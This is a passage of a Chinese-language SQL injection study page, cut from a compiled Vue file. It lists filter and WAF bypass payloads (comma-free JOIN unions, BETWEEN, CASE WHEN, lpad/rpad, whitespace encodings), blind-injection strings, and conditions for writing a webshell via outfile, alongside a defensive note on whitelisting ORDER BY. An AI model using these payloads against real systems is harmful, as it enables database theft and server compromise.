</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>多数情况下，反引号会被过滤，可以使用别名来代替</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> b <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="过滤了逗号怎么办" tabindex="-1"><a class="header-anchor" href="#过滤了逗号怎么办" aria-hidden="true">#</a> 过滤了逗号怎么办</h3><details class="custom-container details"><summary>使用join和别名绕过</summary><p>联合查询的情况</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--原sql命令</span>

<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>

<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> CONCAT_WS<span class="token punctuation">(</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>使用offset关键字绕过</summary><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token comment">--此时 limit 1 offset 2 可以代替 limit 1,2</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><details class="custom-container details"><summary>使用from...for绕过</summary><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and ascii(substr((select database()),1,1))=xxx#

&#39;</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>xxx<span class="token operator">%</span><span class="token number">23</span>

<span class="token comment">--如果过滤了空格，可以用括号代替空格</span>
&#39; <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>xxx<span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details></details><h3 id="大于号尖括号被过滤" tabindex="-1"><a class="header-anchor" href="#大于号尖括号被过滤" aria-hidden="true">#</a> 大于号尖括号被过滤</h3><p>可以使用<code>between and</code>代替尖括号</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--判断条件真假</span>
<span class="token number">2</span> <span class="token operator">&gt;</span> <span class="token number">1</span>   <span class="token comment">--真</span>
<span class="token number">0</span> <span class="token operator">&gt;</span> <span class="token number">1</span>   <span class="token comment">--假</span>

<span class="token comment">--以下用between and 实现判断真假</span>
<span class="token number">2</span> <span class="token operator">between</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token number">3</span>   <span class="token comment">--真</span>
<span class="token number">3</span> betwwen <span class="token number">1</span> <span class="token operator">and</span> <span class="token number">2</span>   <span class="token comment">--假</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>between and还支持16进制，所以可以用16进制，来绕过单引号的过滤</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token string">&#39;a&#39;</span> <span class="token operator">and</span> <span class="token string">&#39;z&#39;</span><span class="token punctuation">;</span>   <span class="token comment">--原sql</span>

<span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token number">0x61</span> <span class="token operator">and</span> <span class="token number">0x7a</span><span class="token punctuation">;</span> <span class="token comment">--16进制</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在sqlmap中使用between and 代替其它字符加上 <code>--tamper=between</code> 即可</p><h3 id="过滤if" tabindex="-1"><a class="header-anchor" href="#过滤if" aria-hidden="true">#</a> 过滤if</h3><p>使用case when语句绕过</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token number">0</span><span class="token string">&#39; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#

0&#39;</span> <span class="token operator">or</span> <span class="token keyword">case</span> <span class="token keyword">when</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">97</span> <span class="token keyword">then</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span> <span class="token keyword">end</span><span class="token comment">#</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="过滤-substr" tabindex="-1"><a class="header-anchor" href="#过滤-substr" aria-hidden="true">#</a> 过滤 substr</h3><p>可以使用lpad()和rpad()绕过substr()</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> lpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- s</span>
<span class="token keyword">select</span> lpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- se</span>
<span class="token keyword">select</span> lpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- sec</span>
<span class="token keyword">select</span> lpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- secu</span>
<span class="token keyword">select</span> lpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- secur</span>
<span class="token keyword">select</span> lpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- securi</span>
<span class="token keyword">select</span> lpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- securit</span>
<span class="token keyword">select</span> lpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- security</span>

<span class="token keyword">select</span> rpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- s</span>
<span class="token keyword">select</span> rpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- se</span>
<span class="token keyword">select</span> rpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- sec</span>
<span class="token keyword">select</span> rpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- secu</span>
<span class="token keyword">select</span> rpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- secur</span>
<span class="token keyword">select</span> rpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- securi</span>
<span class="token keyword">select</span> rpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- securit</span>
<span class="token keyword">select</span> rpad<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">-- security</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>函数语法：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>lpad<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>length<span class="token punctuation">,</span>str2<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串</p><p>如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断</p><h3 id="waf绕过原理" tabindex="-1"><a class="header-anchor" href="#waf绕过原理" aria-hidden="true">#</a> WAF绕过原理</h3><p>关键字双写绕过</p><p>内联注释执行SQL</p><p>注释符加%0a换行执行SQL</p><p>空格被过滤，用%0a、%0b、%0c、%0d、%09、%A0代替</p><p>利用HTTP/1.1新特性pipeline，在第二个数据包带入脏数据，\`Chunked分块传输\`\`\`</p><h2 id="常见问题" tabindex="-1"><a class="header-anchor" href="#常见问题" aria-hidden="true">#</a> 常见问题</h2><details class="custom-container details"><summary>预编译为何不好防御order by注入？</summary><p>1）预编译会自动给传入的参数加上引号</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>String <span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot; SELECT xxx FROM xxx WHERE xxx = ? &quot;</span><span class="token punctuation">;</span>     <span class="token comment">--原预编译sql语句</span>
String <span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot; SELECT xxx FROM xxx WHERE xxx = &#39;abc&#39; &quot;</span><span class="token punctuation">;</span> <span class="token comment">--传入数据经过预编译处理后的语句 </span>

<span class="token comment">--这样可以有效的防止用户的输入直接拼接在sql语句之后,如用户输入xxx=&#39; or &#39;1&#39;=&#39;1时,无法达到攻击的效果</span>
String <span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot; SELECT xxx FROM xxx WHERE xxx = &#39;&#39; or &#39;1&#39;=&#39;1&#39; &quot;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）对order by之后的输入进行参数化</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot;SELECT xxx FROM xxx WHERE xxx =&#39;xxx&#39; order by &#39;xxx&#39;&quot;</span><span class="token punctuation">;</span>
<span class="token comment">--此时&#39;xxx&#39;是字符串而不是字段名,会造成sql语法错误</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>任何需要字符串且不能够加引号的地方都有可能发生类似的注入</p><p>3）如何防范order by注入？</p><p>使用白名单限制order by之后的字段</p><p>因为order by之后跟的字段名肯定有限，且是数据库中已经存在的字段</p></details><details class="custom-container details"><summary>盲注的加速方法？</summary><p>1）Windows平台上的Mysql可以用DNSlog加速注入</p><p>2）利用二分查找法</p><ul><li>利用 ASCII 码作为条件来查询，ASCII 码中字母范围在65~122之间</li><li>以这个范围的中间数为条件，判断payload中传入的 ASCII 码是否大于这个中间数</li><li>如果大于，就往中间数<sub>122这块查找。反之亦然</sub></li></ul></details><details class="custom-container details"><summary>mysql的用户名密码是存放在那张表里面？mysql密码采用哪种加密方式？</summary><p>mysql数据库的user表，以MySQL 4.1版本为分界线，两种加密方式。</p><p>mysql323加密：（16位）、mysqlSHA1加密：（去掉*号40位）</p></details><details class="custom-container details"><summary>mysql版本低于5.0怎么注入？</summary><p>MySQL 5.0以下没有<code>information_schema</code>这个系统表，无法列表名；</p><p>安全狗3.5版本会拦截information_schema关键字；这个时候可以利用虚表取数据；</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> b <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>如何通过sql注入写shell，条件是什么?</summary><p>可以使用outfile或dumpfile将shell写到网站目录</p><p>dumpfile每次只能导出一行数据，不会在末尾追加行，可用来写入二进制文件</p><p><strong>利用条件</strong></p><p>1）数据库用户为root权限</p><p>2）知道网站绝对路径，且有写入权限</p><p>3）PHP的GPC为off状态（魔术引号 POST、GET、Cookie）</p></details>`,112);function v(h,g){const e=l("ExternalLinkIcon");return t(),o("div",null,[u,s("details",r,[d,s("p",null,[n("可以让两个非常大的数据表做"),s("a",k,[n("笛卡尔积"),c(e)]),n("产生大量的计算从而产生时间延迟")]),m]),b])}const x=p(i,[["render",v],["__file","SQL注入漏洞.html.vue"]]);export{x as default};
